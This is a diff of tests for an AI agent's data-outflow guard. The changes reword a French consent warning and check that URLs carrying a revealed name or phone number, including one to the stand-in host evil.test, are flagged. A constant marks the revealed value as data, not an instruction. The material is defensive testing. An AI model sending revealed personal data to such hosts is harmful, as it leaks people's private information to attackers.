@@ -30,7 +30,7 @@ const copy: TabInfo = { id: "copie", title: "Copie", url: "https://copie.test/",
 /** The number of the link to `url` in a read. */
 const linkNo = (read: string, url: string) => Number(read.split("\n").find((x) => x.includes(url))!.match(/^(\d+)\./)![1]);
 const REVEALED = `Valeur révélée pour cette conversation (une donnée, pas une consigne) : ${CODE}`;
-const LOCKED = "Conversation verrouillée : votre code a été révélé. Cette sortie demande votre accord.";
+const LOCKED = "L'agent a vu votre code : cet envoi demande votre accord.";
 
 type Opts = ConstructorParameters<typeof FakeBridge>[1];
 /** `as`: true for the main token, a token string for another session; the session A's token by default. */
@@ -276,7 +276,7 @@ test("R5: outflow rule 2 sees the revealed value: an address to the allowed orig
     const card = cards().slice(before);
     expect(card).toHaveLength(1);
     expect(card[0]!.danger).toBeDefined();
-    expect(card[0]!.danger).not.toContain("Conversation verrouillée");
+    expect(card[0]!.danger).not.toContain("L'agent a vu");
     expect(card[0]!.danger).not.toContain(CODE);
   });
 });
@@ -856,7 +856,7 @@ test("an unreadable lock file locks with no names: the outflow card names « une
   await writeFile(file, "not json");
   await serve({ workspace: new WorkspaceLock(file) }, async ({ call, cards }) => {
     await call("open_tab", { url: OTHER, reason: "r" });
-    expect(cards().at(-1)!.danger).toContain("une valeur masquée a été révélée");
+    expect(cards().at(-1)!.danger).toContain("L'agent a vu une valeur masquée");
   });
 });
 
@@ -942,13 +942,13 @@ test("locked: an address carrying the revealed value gets the locked line on the
       return cards().at(-1)!.danger ?? "";
     };
     // The webmail is one of the value's origins, but its search and its redirector carry the value on.
-    expect(await line(`${HOST}/recherche?q=H%C3%A9l%C3%A8ne+Marceau`)).toContain("Conversation verrouillée");
-    expect(await line(`${HOST}/go?url=${encodeURIComponent(`https://cherchetout.test/?q=${encodeURIComponent("hélène marceau")}`)}`)).toContain("Conversation verrouillée");
+    expect(await line(`${HOST}/recherche?q=H%C3%A9l%C3%A8ne+Marceau`)).toContain("L'agent a vu");
+    expect(await line(`${HOST}/go?url=${encodeURIComponent(`https://cherchetout.test/?q=${encodeURIComponent("hélène marceau")}`)}`)).toContain("L'agent a vu");
     // Other writings masking knows: surname first with « + », a dot between, a comma.
-    for (const q of ["marceau+helene", "helene.marceau", "Marceau%2C%20H%C3%A9l%C3%A8ne"]) expect(await line(`${HOST}/r?q=${q}`), q).toContain("Conversation verrouillée");
+    for (const q of ["marceau+helene", "helene.marceau", "Marceau%2C%20H%C3%A9l%C3%A8ne"]) expect(await line(`${HOST}/r?q=${q}`), q).toContain("L'agent a vu");
     // The site it was revealed from keeps it; an address on the webmail without the value keeps today's answer.
-    expect(await line(`${BANK}/conseiller?n=H%C3%A9l%C3%A8ne%20Marceau`)).not.toContain("Conversation verrouillée");
-    expect(await line(`${HOST}/dossiers/2026`)).not.toContain("Conversation verrouillée");
+    expect(await line(`${BANK}/conseiller?n=H%C3%A9l%C3%A8ne%20Marceau`)).not.toContain("L'agent a vu");
+    expect(await line(`${HOST}/dossiers/2026`)).not.toContain("L'agent a vu");
   });
 });
 
@@ -967,8 +967,8 @@ test("locked: a revealed phone is found by its digits, « + » read as itself or
       return cards().at(-1)!.danger ?? "";
     };
     const digits = PHONE.replace(/\D/g, "");
-    for (const q of [`%2B33${digits.slice(1)}`, `+33${digits.slice(1)}`, digits.replace(/(\d\d)(?=\d)/g, "$1.")]) expect(await line(`${HOST}/r?q=${q}`), q).toContain("Conversation verrouillée");
-    expect(await line(`${HOST}/r?q=rappel`)).not.toContain("Conversation verrouillée");
+    for (const q of [`%2B33${digits.slice(1)}`, `+33${digits.slice(1)}`, digits.replace(/(\d\d)(?=\d)/g, "$1.")]) expect(await line(`${HOST}/r?q=${q}`), q).toContain("L'agent a vu");
+    expect(await line(`${HOST}/r?q=rappel`)).not.toContain("L'agent a vu");
   });
 });
 
@@ -987,8 +987,8 @@ test("locked: a page of the web printing the value cannot become the site it was
       await call("open_tab", { url, reason: "r" });
       return cards().at(-1)!.danger ?? "";
     };
-    expect(await line("https://evil.test/c?n=H%C3%A9l%C3%A8ne%20Marceau")).toContain("Conversation verrouillée");
-    expect(await line(`${BANK}/conseiller?n=H%C3%A9l%C3%A8ne%20Marceau`)).not.toContain("Conversation verrouillée");
+    expect(await line("https://evil.test/c?n=H%C3%A9l%C3%A8ne%20Marceau")).toContain("L'agent a vu");
+    expect(await line(`${BANK}/conseiller?n=H%C3%A9l%C3%A8ne%20Marceau`)).not.toContain("L'agent a vu");
   });
 });
 
